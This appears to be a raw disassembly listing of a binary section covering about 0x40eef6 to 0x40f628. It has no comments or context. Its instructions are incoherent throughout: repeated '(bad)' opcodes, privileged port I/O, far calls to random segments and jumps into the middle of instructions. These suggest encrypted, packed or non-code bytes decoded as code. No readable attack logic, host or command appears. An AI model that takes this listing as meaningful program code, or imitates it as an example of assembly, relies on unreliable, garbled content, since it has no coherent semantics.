  40eef6:	fdivr  DWORD PTR [esi]
  40eef8:	adc    ch,BYTE PTR [edx]
  40eefa:	outs   dx,DWORD PTR ds:[esi]
  40eefb:	leave  
  40eefc:	pop    eax
  40eefd:	jmp    0x40eef3
  40eeff:	cmp    BYTE PTR [edi+0x47abb8f1],ch
  40ef05:	push   0xffffff85
  40ef07:	adc    DWORD PTR [eax-0x4cf3a21d],ebx
  40ef0d:	xor    BYTE PTR [esi+0x21],bl
  40ef10:	loope  0x40ef40
  40ef12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef13:	xor    ebp,DWORD PTR [ecx-0x25f1f107]
  40ef19:	or     al,0xcb
  40ef1b:	mov    al,ds:0xd2fc04e9
  40ef20:	push   ecx
  40ef21:	nop
  40ef22:	add    DWORD PTR [ebx+0x51e81cb8],ebx
  40ef28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef29:	push   ds
  40ef2a:	push   esp
  40ef2b:	xor    eax,0x38d38fa1
  40ef30:	inc    esp
  40ef31:	jecxz  0x40ef42
  40ef33:	push   es
  40ef34:	out    dx,al
  40ef35:	xsavec ds:0xfb147456
  40ef3c:	lea    edx,[edi]
  40ef3e:	inc    eax
  40ef3f:	imul   esi,DWORD PTR [eax+0x41126081],0x42
  40ef46:	add    BYTE PTR ds:[edi-0x4e],al
  40ef4a:	mov    ebx,0xcbfeb6c9
  40ef4f:	push   eax
  40ef50:	call   0x10ea:0x72979cc3
  40ef57:	scas   eax,DWORD PTR es:[edi]
  40ef58:	xlat   BYTE PTR ds:[ebx]
  40ef59:	lahf   
  40ef5a:	mov    dl,0x87
  40ef5c:	inc    edx
  40ef5d:	mov    cl,BYTE PTR [edi-0x25]
  40ef60:	test   eax,0x2cbc0e7f
  40ef65:	imul   ebx,DWORD PTR [eax+eiz*8-0x51457413],0x21
  40ef6d:	rol    DWORD PTR [edi-0x3f],cl
  40ef70:	jmp    0x8e5fb387
  40ef75:	stc    
  40ef76:	mov    al,ds:0xcce0a6d7
  40ef7b:	popf   
  40ef7c:	in     eax,0xe0
  40ef7e:	xor    DWORD PTR [ebp+0x29],edi
  40ef81:	jne    0x40ef2c
  40ef83:	outs   dx,BYTE PTR ds:[esi]
  40ef84:	or     bh,bl
  40ef86:	jne    0x40ef66
  40ef88:	xchg   edx,eax
  40ef89:	cmp    esp,ecx
  40ef8b:	xchg   ecx,eax
  40ef8c:	pop    DWORD PTR [ecx+0x462086c8]
  40ef92:	rcl    BYTE PTR [esi+0x3],1
  40ef95:	pop    ebx
  40ef96:	xor    ebp,ecx
  40ef98:	pmaddwd mm3,mm7
  40ef9b:	push   0xffffffed
  40ef9d:	push   edx
  40ef9e:	ret    0xaaf8
  40efa1:	mov    eax,0x8c9a33dc
  40efa6:	add    BYTE PTR [ecx+ecx*8+0x1f5b4874],dl
  40efad:	lock mov dh,0x1d
  40efb0:	cdq    
  40efb1:	jno    0x40efed
  40efb3:	dec    eax
  40efb4:	ja     0x40ef45
  40efb6:	and    dh,BYTE PTR [ebx+ecx*4]
  40efb9:	shl    ebx,cl
  40efbb:	jne    0x40f03c
  40efbd:	scas   al,BYTE PTR es:[edi]
  40efbe:	shl    BYTE PTR [edx],1
  40efc0:	dec    ebp
  40efc1:	adc    eax,0xc7aefc10
  40efc6:	push   cs
  40efc7:	mov    al,0xcd
  40efc9:	push   ss
  40efca:	xor    al,BYTE PTR [edi]
  40efcc:	xchg   ebp,eax
  40efcd:	mov    ebx,0xb2970985
  40efd2:	mov    ebx,0x391c05f9
  40efd7:	lods   al,BYTE PTR ds:[esi]
  40efd8:	(bad)  
  40efd9:	fidivr WORD PTR ds:0x2af01084
  40efdf:	sbb    ah,cl
  40efe1:	(bad)
  40efe5:	mov    WORD PTR [ebx-0x2],fs
  40efe8:	stos   DWORD PTR es:[edi],eax
  40efe9:	repz bound ecx,QWORD PTR [edx]
  40efec:	mov    edx,0x433e57c5
  40eff1:	outs   dx,DWORD PTR ds:[esi]
  40eff2:	sub    BYTE PTR [ecx],bl
  40eff4:	add    edx,DWORD PTR [esi-0x2fa0037e]
  40effa:	cmp    cl,BYTE PTR [edi+edx*1+0x4be5c6de]
  40f001:	pop    edx
  40f002:	xchg   ecx,eax
  40f003:	mov    DWORD PTR [ebx+0x54271220],ecx
  40f009:	popa   
  40f00a:	push   es
  40f00b:	(bad)  
  40f00c:	mov    BYTE PTR ds:0xc5be3589,bh
  40f012:	jge    0x40efc8
  40f014:	sbb    edi,DWORD PTR [ecx-0x14]
  40f017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f018:	cld    
  40f019:	aaa    
  40f01a:	pusha  
  40f01b:	dec    esp
  40f01c:	jp     0x40f04d
  40f01e:	xchg   esp,eax
  40f01f:	test   BYTE PTR [eax],dl
  40f021:	movq   QWORD PTR [ebx],mm1
  40f024:	in     eax,dx
  40f025:	jmp    0x40f011
  40f027:	fdivrp st(7),st
  40f029:	add    eax,0x7f2b2897
  40f02e:	ret    
  40f02f:	and    eax,0x7192f40d
  40f034:	gs (bad) 
  40f036:	fild   WORD PTR [ecx+ebp*1-0x3d]
  40f03a:	iret   
  40f03b:	mov    al,0xb6
  40f03d:	adc    DWORD PTR [esp+eiz*2],esp
  40f040:	dec    edi
  40f041:	repnz ror DWORD PTR [edi-0xa571cd0],cl
  40f048:	pop    esp
  40f049:	lahf   
  40f04a:	sbb    bl,dh
  40f04c:	dec    edx
  40f04d:	cmp    al,0x2a
  40f04f:	cmc    
  40f050:	out    0x9,eax
  40f052:	aaa    
  40f053:	adc    BYTE PTR [ebp+0x2609d7f1],al
  40f059:	rcr    cl,cl
  40f05b:	das    
  40f05c:	jmp    0x7c102a6e
  40f061:	test   BYTE PTR [edi],0x83
  40f064:	mov    bl,0xf4
  40f066:	mov    esp,0x221bcae7
  40f06b:	loope  0x40f025
  40f06d:	outs   dx,BYTE PTR ds:[esi]
  40f06e:	fstp   DWORD PTR [edx]
  40f070:	in     eax,dx
  40f071:	push   0xfb6e94dd
  40f076:	jns    0x40eff8
  40f078:	mov    BYTE PTR [edx+eiz*1+0x19c9e1c2],bl
  40f07f:	adc    al,0x64
  40f081:	xchg   BYTE PTR [esi-0x63],al
  40f084:	push   edx
  40f085:	in     eax,dx
  40f086:	cmp    al,0x35
  40f088:	xor    dh,ah
  40f08a:	adc    BYTE PTR [eax+0x5a9246ae],bh
  40f090:	fmul   DWORD PTR [esi+0x6e2576c4]
  40f096:	cmp    DWORD PTR [esi-0x3d94f063],ebx
  40f09c:	fnsave [esp+edx*2]
  40f09f:	inc    esi
  40f0a0:	add    BYTE PTR [edi],dh
  40f0a2:	or     bh,bh
  40f0a4:	sti    
  40f0a5:	jp     0x40f0ea
  40f0a7:	ins    DWORD PTR es:[edi],dx
  40f0a8:	cmp    esp,edx
  40f0aa:	pop    edx
  40f0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0ac:	inc    esp
  40f0ad:	stos   BYTE PTR es:[edi],al
  40f0ae:	xchg   ebp,eax
  40f0af:	ffreep st(4)
  40f0b1:	mov    dh,0x28
  40f0b3:	inc    ecx
  40f0b4:	mov    edi,0xc527d0e
  40f0b9:	adc    ecx,DWORD PTR [ebp+ebp*2-0x67199b62]
  40f0c0:	call   0xf91649b9
  40f0c5:	jmp    0x40f0b8
  40f0c7:	imul   edi,DWORD PTR ds:0x4b5ba749,0xffffffd3
  40f0ce:	imul   ebp,DWORD PTR [edx+ebp*2],0xffffffbd
  40f0d2:	adc    eax,0xaf4616c8
  40f0d7:	cmp    ecx,DWORD PTR ds:0x58a19ae2
  40f0dd:	in     eax,0x4c
  40f0df:	fstp   TBYTE PTR ds:0xd7615761
  40f0e5:	xchg   esi,eax
  40f0e6:	push   esi
  40f0e7:	loop   0x40f15e
  40f0e9:	dec    ebp
  40f0ea:	xor    al,0x6b
  40f0ec:	icebp  
  40f0ed:	(bad)  
  40f0ee:	jge    0x40f13a
  40f0f0:	fisttp QWORD PTR [ebx+0x2ccddf95]
  40f0f6:	cli    
  40f0f7:	mov    dh,0xed
  40f0f9:	(bad)  
  40f0fa:	jmp    0xfdc8:0x50e8fa5f
  40f101:	xchg   BYTE PTR [ebx+0x2504a3dc],bl
  40f107:	test   BYTE PTR [ebp+ebp*1-0x38],bl
  40f10b:	cmp    eax,0xb16066b7
  40f110:	push   edi
  40f111:	xchg   ebp,eax
  40f112:	mov    esi,edx
  40f114:	pop    es
  40f115:	dec    esi
  40f116:	(bad)  
  40f117:	pop    esi
  40f118:	jp     0x40f0bd
  40f11a:	addr16 (bad) 
  40f11c:	or     BYTE PTR [ebx],bl
  40f11e:	retf   
  40f11f:	dec    edi
  40f120:	jno    0x40f0d8
  40f122:	inc    edi
  40f123:	xlat   BYTE PTR ds:[ebx]
  40f124:	stos   BYTE PTR es:[edi],al
  40f125:	sbb    dh,BYTE PTR [ebx]
  40f127:	sahf   
  40f128:	cli    
  40f129:	mov    WORD PTR [esp+ebp*1],fs
  40f12c:	pop    ss
  40f12d:	sbb    dh,BYTE PTR [edi+0x1d5ea44d]
  40f133:	mov    al,ds:0x9fdea09c
  40f138:	fild   QWORD PTR [edi-0x22]
  40f13b:	sub    cl,BYTE PTR [esi]
  40f13d:	sbb    esi,edi
  40f13f:	mov    edx,0xc8db15d8
  40f144:	scas   al,BYTE PTR es:[edi]
  40f145:	mov    cl,0x3d
  40f147:	jbe    0x40f0f7
  40f149:	dec    ebp
  40f14b:	bswap  ebx
  40f14d:	aam    0xab
  40f14f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f150:	mov    ebp,DWORD PTR [esi-0x5196a5cb]
  40f156:	aad    0x58
  40f158:	jmp    0x40f134
  40f15a:	mov    DWORD PTR [edi-0x18],0x3f2af618
  40f161:	xchg   esi,eax
  40f162:	fidivr DWORD PTR [ebx-0x68]
  40f165:	outs   dx,DWORD PTR ds:[esi]
  40f166:	hlt    
  40f167:	push   edi
  40f168:	in     eax,dx
  40f169:	pop    eax
  40f16a:	in     eax,dx
  40f16b:	sbb    cl,BYTE PTR [edi-0x18]
  40f16e:	cwde   
  40f16f:	xchg   ebp,eax
  40f170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f171:	push   esi
  40f172:	pop    ebp
  40f173:	repz sar BYTE PTR [edi],1
  40f176:	outs   dx,BYTE PTR ss:[esi]
  40f178:	jne    0x40f141
  40f17a:	in     eax,dx
  40f17b:	add    DWORD PTR [ebx+ebp*8],edi
  40f17e:	cmp    edx,ebp
  40f180:	sbb    bh,BYTE PTR [edx-0x5b]
  40f183:	push   esp
  40f184:	adc    eax,0x638b59e
  40f189:	scas   al,BYTE PTR es:[edi]
  40f18a:	jo     0x40f202
  40f18c:	fwait
  40f18d:	rcl    DWORD PTR [ebp+ebx*8-0x2c],1
  40f191:	adc    al,al
  40f193:	sbb    DWORD PTR [edi],edi
  40f195:	aaa    
  40f196:	xchg   ecx,eax
  40f197:	sbb    al,0x18
  40f199:	ja     0x40f1e2
  40f19b:	or     edx,DWORD PTR [ecx-0xd]
  40f19e:	ror    BYTE PTR [esi+0x319fe918],0x76
  40f1a5:	push   ecx
  40f1a6:	push   esi
  40f1a7:	pop    edi
  40f1a8:	shr    DWORD PTR [eax+0x3f],1
  40f1ab:	mov    ds:0x34ac27a6,al
  40f1b0:	mov    bh,0xdd
  40f1b2:	fbld   TBYTE PTR [ebx+0x92e5054]
  40f1b8:	scas   al,BYTE PTR es:[edi]
  40f1b9:	xchg   edx,eax
  40f1ba:	add    BYTE PTR [edx],dl
  40f1bc:	out    0xb2,al
  40f1be:	jmp    0x40f214
  40f1c0:	add    eax,0x89a699a2
  40f1c5:	mov    edi,0xb36dff37
  40f1ca:	int    0xbd
  40f1cc:	cmp    DWORD PTR [eax],ebp
  40f1ce:	in     al,dx
  40f1cf:	pop    ecx
  40f1d0:	retf   0xc350
  40f1d3:	mov    bl,0xfb
  40f1d5:	retf   0x1a28
  40f1d8:	aam    0xaa
  40f1da:	fnstsw WORD PTR [ecx+esi*1]
  40f1dd:	xchg   edi,eax
  40f1de:	cmp    al,0x5e
  40f1e0:	mov    DWORD PTR [ecx+edx*2],ecx
  40f1e3:	pop    ds
  40f1e4:	and    ecx,DWORD PTR [edx+0x59]
  40f1e7:	or     DWORD PTR [edx],edx
  40f1e9:	dec    edx
  40f1ea:	mov    ebx,0x6ecccc05
  40f1ef:	fld    TBYTE PTR [esi-0x4c]
  40f1f2:	cmp    ebp,esi
  40f1f4:	xor    cl,BYTE PTR [ebp+0x62697c70]
  40f1fa:	imul   ecx,DWORD PTR [esi+0x15],0xdac268f
  40f201:	rcl    DWORD PTR [edx],cl
  40f203:	rcr    DWORD PTR [edx-0x13509fc],cl
  40f209:	jmp    0x2d1d:0x8882a7b4
  40f210:	cmp    edi,DWORD PTR [edx-0x1d]
  40f213:	lods   al,BYTE PTR ds:[esi]
  40f214:	shr    BYTE PTR [esi-0x24],0x8c
  40f218:	sbb    DWORD PTR [eax+edx*1],eax
  40f21b:	ret    0x1509
  40f21e:	sbb    BYTE PTR [edi+0x7],bh
  40f221:	or     eax,0x1d64d74c
  40f226:	ins    DWORD PTR es:[edi],dx
  40f227:	push   ebp
  40f228:	addr16 dec edi
  40f22a:	jp     0x40f230
  40f22c:	mov    ds:0xa9d1e3c0,eax
  40f231:	pop    ebp
  40f232:	scas   al,BYTE PTR es:[edi]
  40f233:	popa   
  40f234:	dec    edi
  40f235:	xor    DWORD PTR [edi+0x47],edi
  40f238:	popf   
  40f239:	adc    DWORD PTR [eax],ebx
  40f23b:	xor    al,0x59
  40f23d:	push   eax
  40f23e:	jge    0x40f290
  40f240:	shr    DWORD PTR [ebx+0x1f],0xe8
  40f244:	xor    al,0x92
  40f246:	call   0xac7d:0xc237ef0d
  40f24d:	mov    ds:0x6f4cafbb,al
  40f252:	inc    edx
  40f253:	cld    
  40f254:	dec    edx
  40f255:	fist   WORD PTR [esp+eiz*8+0x45adf627]
  40f25c:	lods   eax,DWORD PTR ds:[esi]
  40f25d:	in     al,0x91
  40f25f:	push   ds
  40f260:	or     al,0x44
  40f262:	sbb    BYTE PTR [eax],al
  40f264:	inc    ebx
  40f265:	imul   DWORD PTR [ecx-0x1]
  40f268:	pop    ebx
  40f269:	scas   eax,DWORD PTR es:[edi]
  40f26a:	ja     0x40f272
  40f26c:	cwde   
  40f26d:	fs inc edx
  40f26f:	xchg   ebx,eax
  40f270:	mov    al,0xcc
  40f272:	sub    eax,0x6aa22e0a
  40f277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f278:	mov    fs,WORD PTR [edi+0x4b]
  40f27b:	xchg   ebp,eax
  40f27c:	popa   
  40f27d:	mov    BYTE PTR [eax+0x6c],ah
  40f280:	adc    BYTE PTR [ebp-0x65c80665],ch
  40f286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f287:	or     esi,edi
  40f289:	push   ds
  40f28a:	xor    esi,edi
  40f28c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f28d:	lods   al,BYTE PTR ds:[esi]
  40f28e:	sub    esi,DWORD PTR [ebx+ebp*8]
  40f291:	sub    eax,0x6e43041b
  40f296:	mov    ch,0x9c
  40f298:	xor    al,0xeb
  40f29a:	mov    ecx,0xbc67a23b
  40f29f:	sbb    esp,DWORD PTR [ecx-0x11]
  40f2a2:	dec    edi
  40f2a3:	or     esi,edx
  40f2a5:	in     al,0xbf
  40f2a7:	(bad)  
  40f2a8:	xlat   BYTE PTR ds:[ebx]
  40f2a9:	repz jae 0x40f2f7
  40f2ac:	sbb    cl,ch
  40f2ae:	(bad)  
  40f2af:	fld    DWORD PTR [ebp-0x2e]
  40f2b2:	cwde   
  40f2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2b4:	sbb    esp,ecx
  40f2b6:	inc    ebx
  40f2b7:	lahf   
  40f2b8:	sub    ecx,eax
  40f2ba:	ficomp WORD PTR [esi]
  40f2bc:	sbb    bh,ah
  40f2be:	mov    ah,0x8f
  40f2c0:	repnz push esp
  40f2c2:	mov    bh,0x84
  40f2c4:	mov    al,ds:0x2bac03a0
  40f2c9:	mov    bl,0x40
  40f2cb:	cmp    bh,BYTE PTR [esi-0x63a3aaf2]
  40f2d1:	inc    esi
  40f2d3:	adc    ecx,DWORD PTR [bp+si]
  40f2d6:	outs   dx,BYTE PTR ds:[esi]
  40f2d7:	test   eax,0x8c87680b
  40f2dc:	or     ecx,DWORD PTR [eax]
  40f2de:	cmc    
  40f2df:	xchg   esp,eax
  40f2e0:	pop    esi
  40f2e1:	lahf   
  40f2e2:	in     eax,dx
  40f2e3:	daa    
  40f2e4:	or     eax,0x5da3a929
  40f2e9:	dec    ebx
  40f2ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2ec:	dec    eax
  40f2ed:	fcom   DWORD PTR [edx-0x1935a6e9]
  40f2f3:	xchg   DWORD PTR [ebp-0x1b],eax
  40f2f6:	rcl    DWORD PTR [ebp-0x680cbe48],0x60
  40f2fd:	mov    eax,0xf9ab5af2
  40f302:	in     eax,0xab
  40f304:	loope  0x40f2c3
  40f306:	out    0x6f,al
  40f308:	xchg   edi,eax
  40f309:	mov    cl,0xc
  40f30b:	adc    esp,edi
  40f30d:	jae    0x40f30a
  40f30f:	ret    0x9fbb
  40f312:	add    DWORD PTR [ecx],ecx
  40f314:	sbb    DWORD PTR [eax],esp
  40f316:	jbe    0x40f2f4
  40f318:	jmp    0x118a37d6
  40f31d:	inc    esi
  40f31e:	scas   al,BYTE PTR es:[edi]
  40f31f:	or     DWORD PTR [ebx],ebx
  40f321:	and    DWORD PTR [ebp+edx*8+0xa],ebx
  40f325:	mov    eax,0x7a198933
  40f32a:	sub    al,0x15
  40f32c:	clc    
  40f32d:	into   
  40f32e:	shr    BYTE PTR [ecx-0x4d1a8ccf],1
  40f334:	inc    edi
  40f335:	in     eax,dx
  40f336:	mov    ss,ebp
  40f338:	in     eax,0x6
  40f33a:	lahf   
  40f33b:	ret    0x6e22
  40f33e:	ror    BYTE PTR [edx-0x7247bbf2],0x30
  40f345:	(bad)  
  40f346:	addr16 xchg esi,eax
  40f348:	stc    
  40f349:	pusha  
  40f34a:	sahf   
  40f34b:	adc    dl,ch
  40f34d:	int    0x1e
  40f34f:	sbb    eax,0x186fa0c
  40f354:	rol    DWORD PTR fs:[ebp-0x691f812c],0xba
  40f35c:	xchg   BYTE PTR [ecx+eiz*4],cl
  40f35f:	retf   0xfbac
  40f362:	lods   al,BYTE PTR ds:[esi]
  40f363:	or     al,0xbf
  40f365:	inc    ebp
  40f366:	add    DWORD PTR [esi-0x8],ebp
  40f369:	les    ebp,FWORD PTR [esi]
  40f36b:	int3   
  40f36c:	out    dx,eax
  40f36d:	fldcw  WORD PTR [edx]
  40f36f:	cs jnp 0x40f314
  40f372:	ja     0x40f3dd
  40f374:	ja     0x40f3be
  40f376:	xchg   esi,eax
  40f377:	xor    al,0xf3
  40f379:	cmp    esi,esp
  40f37b:	or     dh,cl
  40f37d:	ds pushf 
  40f37f:	pop    esp
  40f380:	pop    ebp
  40f381:	mov    ecx,0x48699ec7
  40f386:	sti    
  40f387:	lahf   
  40f388:	stos   DWORD PTR es:[edi],eax
  40f389:	call   0xe0cc195e
  40f38e:	dec    ebx
  40f38f:	data16 fucomi st,st(5)
  40f392:	jne    0x40f3df
  40f394:	adc    BYTE PTR [ebx+0x6c],ah
  40f397:	push   ds
  40f398:	cs jmp 0x40f3ca
  40f39b:	pop    ds
  40f39c:	inc    eax
  40f39d:	xchg   edx,eax
  40f39e:	dec    edx
  40f39f:	sub    edi,DWORD PTR [ecx-0x281aa09f]
  40f3a5:	fwait
  40f3a6:	sbb    BYTE PTR [edi-0x5f9b0fb0],bh
  40f3ac:	inc    eax
  40f3ad:	adc    BYTE PTR [edi],0x55
  40f3b0:	mov    cl,0x49
  40f3b2:	loopne 0x40f408
  40f3b4:	lods   eax,DWORD PTR ds:[esi]
  40f3b5:	shl    BYTE PTR ds:0xa33d826c,1
  40f3bb:	pushf  
  40f3bc:	push   ecx
  40f3bd:	jle    0x40f39d
  40f3bf:	lods   eax,DWORD PTR ds:[esi]
  40f3c0:	pop    ebp
  40f3c1:	pop    esi
  40f3c2:	retf   0x8df8
  40f3c5:	jb     0x40f382
  40f3c7:	jno    0x40f3e1
  40f3c9:	push   ss
  40f3ca:	fstp   st(3)
  40f3cc:	clc    
  40f3cd:	out    dx,eax
  40f3ce:	cmp    ecx,DWORD PTR [ecx+0x64]
  40f3d1:	loop   0x40f3e5
  40f3d3:	ret    
  40f3d4:	mov    ds:0xf906b18,eax
  40f3d9:	cmp    esp,DWORD PTR [ecx-0x12]
  40f3dc:	dec    ecx
  40f3dd:	fs call 0xbe0f:0x7ca413dc
  40f3e5:	cmc    
  40f3e6:	(bad)  
  40f3e7:	popa   
  40f3e8:	pop    ds
  40f3e9:	jo     0x40f3ff
  40f3eb:	int3   
  40f3ec:	xchg   esi,eax
  40f3ed:	stos   BYTE PTR es:[edi],al
  40f3ee:	and    esp,ecx
  40f3f0:	add    al,0x13
  40f3f2:	fldl2e 
  40f3f4:	sub    bl,BYTE PTR [edi-0x56ca6476]
  40f3fa:	imul   BYTE PTR [ebx-0x795de916]
  40f400:	push   ebp
  40f401:	or     BYTE PTR [ecx-0x663c0d81],0x6c
  40f408:	xchg   edi,eax
  40f409:	cmp    edi,DWORD PTR [edx+0x6a58d632]
  40f40f:	fs mov ecx,edx
  40f412:	fs dec esi
  40f414:	dec    edi
  40f415:	xor    BYTE PTR [ecx],bl
  40f417:	jbe    0x40f41f
  40f419:	pop    ecx
  40f41a:	imul   ebx,DWORD PTR [edx-0x50],0xfffffffd
  40f41e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41f:	arpl   WORD PTR ss:0x46a8f592,si
  40f426:	in     eax,0xa3
  40f428:	pop    esp
  40f429:	lock div BYTE PTR [ecx-0x1f1e9e54]
  40f430:	sbb    esi,DWORD PTR [esp+eax*4]
  40f433:	push   edx
  40f434:	push   0xfffffffd
  40f436:	xor    eax,DWORD PTR [ebx-0x5f]
  40f439:	sbb    BYTE PTR [esi],al
  40f43b:	cwde   
  40f43c:	fstp   DWORD PTR [eax+0x45370087]
  40f442:	xor    bh,al
  40f444:	jle    0x40f48a
  40f446:	push   es
  40f447:	sysenter 
  40f449:	add    eax,0x8733b84e
  40f44e:	sub    DWORD PTR [ecx],edi
  40f450:	leave  
  40f451:	and    esi,ebp
  40f453:	inc    esi
  40f454:	add    esp,DWORD PTR [edi-0x75]
  40f457:	aad    0x6a
  40f459:	dec    ebp
  40f45a:	ds sahf 
  40f45c:	iret   
  40f45d:	jmp    0x38d15e38
  40f462:	jle    0x40f428
  40f464:	adc    edx,DWORD PTR [edx-0x17]
  40f467:	push   ecx
  40f468:	mov    ecx,DWORD PTR [ebp+0x4282cd90]
  40f46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f46f:	inc    esp
  40f470:	cmp    BYTE PTR [edi-0xb],0x2d
  40f474:	xor    BYTE PTR [ebp+0x66cf5f6a],ch
  40f47a:	jcxz   0x40f4df
  40f47d:	fld    TBYTE PTR [edi+0x26af8466]
  40f483:	and    eax,0x3153a42a
  40f488:	arpl   WORD PTR [esi],si
  40f48a:	xor    eax,0xcb0fb361
  40f48f:	mov    cl,BYTE PTR [edi]
  40f491:	and    DWORD PTR [ecx+0x12],0xffffffb2
  40f495:	call   0xc98e:0x8f0b2979
  40f49c:	push   0x6e56fdde
  40f4a1:	inc    edi
  40f4a2:	js     0x40f50c
  40f4a4:	(bad)  
  40f4a5:	pop    esi
  40f4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a7:	xchg   ecx,eax
  40f4a8:	test   eax,0x152578d2
  40f4ad:	mov    DWORD PTR [ebp+0x40],edx
  40f4b0:	sar    BYTE PTR [edx-0x26b55d03],0xd0
  40f4b7:	call   0x1bb6:0xfa233370
  40f4be:	cmp    ah,dh
  40f4c0:	les    edi,FWORD PTR [edi+0x74]
  40f4c3:	in     eax,dx
  40f4c4:	xor    DWORD PTR [esi+0x6a5ac82b],eax
  40f4ca:	mov    bh,0x5e
  40f4cc:	or     eax,0x62088fe7
  40f4d1:	shr    DWORD PTR [ebp-0x1a82d5a6],0x2a
  40f4d8:	sbb    DWORD PTR [eax+ecx*8],ebx
  40f4db:	ins    DWORD PTR es:[edi],dx
  40f4dc:	and    ch,bl
  40f4de:	jecxz  0x40f47c
  40f4e0:	ror    BYTE PTR [esi-0x7d59bc9a],cl
  40f4e6:	ret    0xbbaa
  40f4e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4ea:	or     bl,BYTE PTR [ebp+edi*4+0x43]
  40f4ee:	stc    
  40f4ef:	mov    esi,0xef9c330e
  40f4f4:	adc    dl,dl
  40f4f6:	leave  
  40f4f7:	sub    DWORD PTR [eax+0x709839e7],esp
  40f4fd:	xor    ebp,DWORD PTR [esi+esi*8]
  40f500:	js     0x40f483
  40f502:	push   ebp
  40f503:	push   cs
  40f504:	imul   esp,DWORD PTR [ecx-0x7374ff3c],0xffffffca
  40f50b:	sub    esp,0x7e0eea48
  40f511:	jmp    0x40f585
  40f513:	mov    esp,0xf1d2d32b
  40f518:	popf   
  40f519:	xor    ebp,DWORD PTR [edx-0x67116862]
  40f51f:	cmc    
  40f520:	ret    
  40f521:	jg     0x40f509
  40f523:	cld    
  40f524:	push   ecx
  40f525:	retf   
  40f526:	test   al,0xd0
  40f528:	fbld   TBYTE PTR [eax-0x3f]
  40f52b:	aaa    
  40f52c:	dec    ebx
  40f52d:	push   0x27f50b1a
  40f532:	imul   DWORD PTR [edi-0x6ca02f99]
  40f538:	out    dx,al
  40f539:	call   0x16e4d42c
  40f53e:	je     0x40f5b1
  40f540:	inc    eax
  40f541:	ss inc eax
  40f543:	pop    esi
  40f544:	push   0x59
  40f546:	inc    esi
  40f547:	in     al,dx
  40f548:	cmp    edx,edi
  40f54a:	add    BYTE PTR [ecx-0x7b0c97f4],al
  40f550:	mov    edx,0xad6c0615
  40f555:	push   esi
  40f556:	scas   al,BYTE PTR es:[edi]
  40f557:	repnz sti 
  40f559:	dec    ecx
  40f55a:	loope  0x40f55a
  40f55c:	jmp    DWORD PTR [ebx+eiz*2-0x31]
  40f560:	dec    esi
  40f561:	enter  0x1af6,0x18
  40f565:	into   
  40f566:	push   edi
  40f567:	pusha  
  40f568:	mov    ch,0xb6
  40f56a:	sbb    DWORD PTR [ecx+0x46],0xffffffde
  40f56e:	and    BYTE PTR [eax+0x15],al
  40f571:	(bad)  
  40f572:	jecxz  0x40f52f
  40f574:	cmp    al,0x84
  40f576:	and    ecx,DWORD PTR [edi-0x65bbba7f]
  40f57c:	xor    edi,edi
  40f57e:	mov    edi,0x806efbfa
  40f583:	fidivr WORD PTR [esi+0x12]
  40f586:	sub    DWORD PTR [esp+ecx*1],eax
  40f589:	sbb    DWORD PTR [ebx+edx*8+0x5ba5d84d],esi
  40f590:	int    0xd1
  40f592:	shl    ah,0xcf
  40f595:	cmovns edi,eax
  40f598:	mov    DWORD PTR [ebp-0x53cbb66],ebp
  40f59e:	rcr    dh,cl
  40f5a0:	rol    BYTE PTR [esp+ebx*1],1
  40f5a3:	add    ch,BYTE PTR [ebx]
  40f5a5:	aas    
  40f5a6:	xchg   edx,eax
  40f5a7:	mov    ds,WORD PTR [esi+0x3b]
  40f5aa:	mov    edi,ecx
  40f5ac:	or     al,0xa3
  40f5ae:	pushf  
  40f5af:	mov    al,0xf5
  40f5b1:	adc    eax,0x34507350
  40f5b6:	push   ds
  40f5b7:	mov    eax,0x77856603
  40f5bc:	test   eax,0x8352f9b9
  40f5c1:	nop
  40f5c2:	ret    0xe654
  40f5c5:	hlt    
  40f5c6:	(bad)  
  40f5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5c8:	call   0x89ae:0xc7e81d87
  40f5cf:	cld    
  40f5d0:	aam    0x8e
  40f5d2:	imul   ecx,DWORD PTR [esi],0x7993614f
  40f5d8:	pop    ecx
  40f5d9:	or     ebp,DWORD PTR [esi]
  40f5db:	xor    ebp,DWORD PTR [eax+0x21]
  40f5de:	scas   eax,DWORD PTR es:[edi]
  40f5df:	test   BYTE PTR [eax],bl
  40f5e1:	(bad)  
  40f5e2:	je     0x40f62c
  40f5e4:	sbb    BYTE PTR [ecx+ebx*8+0x27bb1a2a],bl
  40f5eb:	sti    
  40f5ec:	mov    bl,BYTE PTR [ebp+edi*4-0x3f992195]
  40f5f3:	stos   DWORD PTR es:[edi],eax
  40f5f4:	xor    edx,0xffffffdc
  40f5f7:	into   
  40f5f8:	call   0x213a1cbc
  40f5fd:	push   ebp
  40f5fe:	cmp    BYTE PTR ds:0x9dcfbbe8,ah
  40f604:	cmp    ebp,ebx
  40f606:	mov    bl,0x33
  40f608:	retf   
  40f609:	xor    BYTE PTR [ebp+0x40],dl
  40f60c:	in     al,0x9c
  40f60e:	cmp    BYTE PTR [eax-0x78a9e7ce],bh
  40f614:	or     DWORD PTR [ebp+0x4e],edx
  40f617:	outs   dx,DWORD PTR ds:[esi]
  40f618:	das    
  40f619:	pop    ds
  40f61a:	dec    ebx
  40f61b:	arpl   WORD PTR [esi+0x5e8cbde6],bx
  40f621:	xchg   esp,eax
  40f622:	xor    DWORD PTR [esi],ebp
  40f624:	outs   dx,DWORD PTR ds:[esi]
  40f625:	loop   0x40f603
  40f627:	dec    ebp
  40f628:	pusha  
